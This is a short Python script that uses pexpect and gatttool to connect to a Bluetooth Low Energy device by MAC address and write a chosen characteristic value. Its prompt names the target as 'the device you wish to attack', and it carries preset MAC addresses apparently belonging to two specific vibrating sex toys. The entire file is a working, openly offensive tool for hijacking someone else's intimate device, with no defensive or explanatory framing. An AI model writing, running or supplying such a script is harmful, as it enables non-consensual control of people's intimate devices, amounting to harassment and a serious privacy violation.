#!/usr/bin/python3
import os
import subprocess
import pexpect
import time
import sys

print("Ensure you have the mac address of the device you wish to attack")

print("Enter the mac address")
dildo = input("")


if dildo == ("flam"):
	dildo = ("50:F1:4A:56:70:11")
	print("Flamingo mode")

if dildo == ("verge"):
	dildo = ("50:8C:B1:44:8A:AB")
	print("Verge mode")

print("Enter the vibration")
vibration = input("")

print("gatttool is starting up")
child = pexpect.spawn("gatttool -I")
child.sendline("connect {0}".format(dildo))
child.expect("Connection successful"),
command="char-write-req {0}".format(vibration)
time.sleep(5)
child.sendline(command)
child.expect("Characteristic value was written successfully", timeout=10)
